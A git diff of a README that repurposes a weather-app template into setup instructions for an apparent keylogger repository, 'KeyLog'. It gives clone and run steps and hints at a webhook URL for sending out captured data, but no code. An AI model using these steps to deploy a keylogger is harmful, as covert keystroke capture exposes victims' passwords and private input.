@@ -10,7 +10,7 @@ Change the Webhook URL at line 28.
 2. Go to your desired directory
 3. Clone the repo
    ```sh
-   git clone https://github.com/Bushra109/Weather-web-app.git
+   git clone https://github.com/0xr4Gn4R/KeyLog.git
    ```
 3. Get into the directory
    ```sh
@@ -23,7 +23,7 @@ Change the Webhook URL at line 28.
   
 ### Run
 ```sh
-  python app.py
+  python keylog.py
 ```
 
 
@@ -31,7 +31,7 @@ Change the Webhook URL at line 28.
 <!-- CONTRIBUTING -->
 ## Contributing
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are *greatly appreciated*.
+Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you is *highly appreciated*.
 
 1. Fork the Project
 2. Create your Feature Branch (`git checkout -b feature/NewFeature`)
@@ -46,6 +46,6 @@ Contributions are what make the open source community such an amazing place to l
 
 Your Name - [Subhajit Sahana](https://www.linkedin.com/in/subhajit-sahana) - sahanasubhojit@gmail.com
 
-Project Link: [https://github.com/your_username/repo_name](https://github.com/Bushra109/Weather-web-app)
+Project Link: [https://github.com/your_username/repo_name](https://github.com/0xr4Gn4R/KeyLog)
 
 # THIS IS ONLY FOR EDUCATIONAL PURPOSES!
